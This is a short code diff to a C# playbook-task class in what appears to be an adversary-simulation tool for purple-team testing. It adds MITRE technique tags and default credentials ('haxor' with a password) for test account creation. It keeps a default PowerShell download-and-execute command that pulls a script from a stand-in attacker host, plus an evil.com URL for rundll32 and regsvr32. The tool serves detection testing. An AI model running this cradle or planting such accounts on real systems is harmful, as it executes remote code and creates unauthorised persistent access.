@@ -154,8 +154,12 @@ namespace PurpleSharp.Lib
         // Used for rundll32.exe, regsvr32.exe and others
         public string url { get; set; } = @"http://evil.com/image.png";
 
-        // Used for PowerShell
+        // Used for PowerShell T1059.001
         public string commandlet { get; set; } = @"iex(New-Object Net.WebClient).DownloadString('http://attacker.home/myscript.ps1')";
+
+        // Used for account creation T1136.001 & T1136.002
+        public string user { get; set; } = @"haxor";
+        public string password { get; set; } = @"Passw0rd123El7";
 
 
         public PlaybookTask()
